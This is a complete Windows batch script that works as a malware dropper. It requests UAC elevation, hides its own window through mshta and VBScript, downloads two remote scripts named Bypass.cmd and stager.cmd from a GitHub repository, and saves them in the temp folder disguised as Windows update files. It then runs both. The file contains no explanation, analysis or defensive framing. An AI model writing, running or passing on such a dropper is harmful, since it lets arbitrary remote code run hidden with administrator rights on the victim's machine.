@echo off
setlocal

:: Admin check with UAC elevation
NET SESSION >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    set "params=%*"
    set "params=%params:"=\"%"
    set "params=%params:'=\"'%"
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~s0\" %params%' -Verb RunAs"
    exit /b
)

:: Hide window
if not "%1"=="hidden" (
    mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c """"%~f0"" hidden"", 0, false"^)
    exit /b
)

:: Configuration
set "PS1_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/master/Bypass.cmd"
set "PS2_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/master/stager.cmd"
set "PS1_FILE=%temp%\WinUpdater.cmd"
set "PS2_FILE=%temp%\WinUpdates.cmd"

:: Download files
powershell -Command "Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%PS1_FILE%'"
powershell -Command "Invoke-WebRequest -Uri '%PS2_URL%' -OutFile '%PS2_FILE%'"

:: Execute scripts
if exist "%PS1_FILE%" call "%PS1_FILE%"
timeout /t 5 /nobreak >nul
if exist "%PS2_FILE%" call "%PS2_FILE%"

endlocal